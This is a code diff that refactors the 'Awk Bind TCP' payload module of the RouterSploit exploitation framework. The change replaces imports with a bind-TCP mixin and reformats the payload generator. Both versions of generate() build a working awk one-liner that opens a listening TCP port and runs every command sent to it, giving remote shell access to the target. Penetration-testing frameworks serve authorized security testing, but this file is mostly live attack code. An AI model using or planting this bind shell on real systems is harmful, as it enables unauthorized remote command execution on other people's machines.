@@ -1,11 +1,8 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators
-)
+from routersploit import exploits
+from routersploit.payloads import BindTCPPayloadMixin, GenericPayload
 
 
-class Exploit(payloads.Payload):
+class Exploit(GenericPayload, BindTCPPayloadMixin):
     __info__ = {
         'name': 'Awk Bind TCP',
         'authors': [
@@ -17,12 +14,13 @@ class Exploit(payloads.Payload):
         ],
     }
 
-    architecture = "generic"
-    handler = "bind_tcp"
-
-    rport = exploits.Option(5555, 'Bind Port', validators=validators.integer)
     awk_binary = exploits.Option('awk', 'Awk binary')
 
     def generate(self):
-        return (self.awk_binary + " 'BEGIN{s=\"/inet/tcp/" + str(self.rport) + "/0/0\";"
-                "for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'")
+        return (
+            self.awk_binary
+            + " 'BEGIN{s=\"/inet/tcp/"
+            + str(self.rport)
+            + "/0/0\";for(;s|&getline c;close(c))"
+              "while(c|getline)print|&s;close(s)}'"
+        )
